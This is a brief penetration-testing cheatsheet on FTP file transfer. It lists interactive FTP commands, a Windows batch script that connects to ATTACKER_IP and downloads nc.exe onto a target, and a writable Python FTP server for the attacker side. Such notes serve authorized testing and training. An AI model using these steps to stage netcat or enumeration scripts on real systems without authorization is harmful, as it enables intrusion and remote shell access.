---
tags: [pentest, transfer, ftp, client, initial-access]
type: cheatsheet
phase: 5
---
# FTP Client Commands

Transfer files via FTP when it's the only protocol available. Also useful for scripted transfers on Windows.

[[00 - README|Folder index]]

## Interactive FTP

```bash
ftp TARGET_IP
# login with credentials
ftp> binary           # switch to binary mode (IMPORTANT for executables)
ftp> get file.txt     # download
ftp> put linpeas.sh   # upload
ftp> mget *.conf      # download multiple files
ftp> ls               # list directory
ftp> cd /var/log      # change directory
ftp> bye              # disconnect
```

> [!warning] Always use binary mode
> ASCII mode corrupts executables and archives. Always run `binary` before transferring non-text files.

## Scripted FTP on Windows (non-interactive)

```cmd
:: Create FTP script
echo open ATTACKER_IP > ftp.txt
echo USER anonymous >> ftp.txt
echo PASS anonymous >> ftp.txt
echo binary >> ftp.txt
echo get nc.exe >> ftp.txt
echo bye >> ftp.txt

:: Run it
ftp -s:ftp.txt
```

## Python FTP server (attacker)

```bash
# pyftpdlib
pip install pyftpdlib
python3 -m pyftpdlib -p 21 -w   # -w = writable (for uploads)
```

## See also

- [[12 - Python HTTP Server Transfer]]
- [[13 - SMB Server Transfer (impacket)]]
